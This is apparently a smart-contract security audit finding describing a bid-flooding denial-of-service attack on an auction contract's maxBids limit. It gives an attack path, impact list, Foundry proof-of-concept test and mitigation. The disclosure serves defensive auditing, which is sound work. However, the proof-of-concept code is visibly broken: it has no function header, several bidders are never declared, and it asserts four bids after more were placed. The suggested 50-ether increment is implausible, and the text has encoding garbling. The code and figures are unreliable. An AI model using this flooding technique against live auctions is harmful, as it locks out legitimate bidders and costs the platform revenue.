# Attacker can flood the auction with small difference bids

### Summary

In this attack, the attacker floods the auction with small, incremental bids using multiple accounts to quickly fill up the allowed bidding slots (or maxBids). The goal is not necessarily to manipulate the price but to prevent other legitimate bidders from having the chance to place a bid, thereby ensuring that the attacker controls the auction's outcome (or, at the very least, restricts competition).

### Root Cause

In [`Auction.sol:125-171`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L125-171) there is no check on the difference each bid must have.

### Internal Pre-conditions

1. Auction has a maxBids limit
2. No minimum bid increment:

### External Pre-conditions

Attacker must have different accounts with enough balance to execute this attack

### Attack Path

1. Attacker bids with a low amount
2. Attacker uses different account to bid again but with very little amount (0.1 eth)
3. Attacker repeats this till the `maxBids` is reached

### Impact

1. Prevents Legitimate Participation: By flooding the auction with small bids, the attacker ensures that the maximum number of bids is reached before other participants can even attempt to bid. Legitimate bidders will be locked out of the auction entirely, unable to place their bids, no matter how much they are willing to pay.
2. Distorts Auction Competition: Even though the attackerâ€™s bids are small and incrementally increasing, they still prevent any meaningful competition from occurring. The auction can be concluded with the attacker having full control over the outcome, which may not reflect the true market value.
3. Reduced Auction Efficiency: The auction may become inefficient if bidders feel they have no chance of competing due to the bid flooding, leading to reduced overall participation in future auctions. This undermines the auction platform's reputation and the trust users have in it.
4. Economic Loss for the Platform: If legitimate bids are excluded due to the flood of small bids, the auction might not capture its true value (i.e., the fair market value of the item being auctioned). This can result in the platform missing out on potential revenue or generating dissatisfaction from users.
5. Attacker won't loss much: Because the attacker will get refund for the other bids, the attacker will not loss that much money but rather win the auction by a very low price.

    address bidder1 = address(0x11111111);
    address bidder2 = address(0x22222222);

    uint256 slot = auction.slotSize();

    usdc.mint(bidder1, 1000 ether);
    usdc.mint(bidder2, 1000 ether);
    usdc.mint(bidder3, 1000 ether);
    usdc.mint(bidder4, 1000 ether);

    // Attacker's first bid (relatively low)
    vm.startPrank(bidder1);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(50 ether, slot); // Low price bid
    vm.stopPrank();

    // Attacker's second bid (slightly higher)
    vm.startPrank(bidder2);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(50.1 ether, slot); // Small increment
    vm.stopPrank();

    // Attacker's third bid (slightly higher again)
    vm.startPrank(bidder3);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(50.2 ether, slot); // Small increment
    vm.stopPrank();

    // Attacker's fourth bid (slightly higher again)
    vm.startPrank(bidder4);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(50.3 ether, slot); // Small increment
    vm.stopPrank();

    // Attacker's fith bid (slightly higher again)
    vm.startPrank(bidder5);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(50.4 ether, slot); // Small increment
    vm.stopPrank();

    // Legitimate bidder trying to participate
    vm.startPrank(legitimateBidder);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(55 ether, slot); // Fair market value bid
    vm.stopPrank();

    // Assert the manipulation
    assertEq(auction.bidCount(), 4, "Should have 4 bids");
  }
```

### Mitigation

Implement a bid minimal increment to prevent this kind of attack. Example, a minimal increatment of 50 eth for each bid will mitigate this kinda of attack.
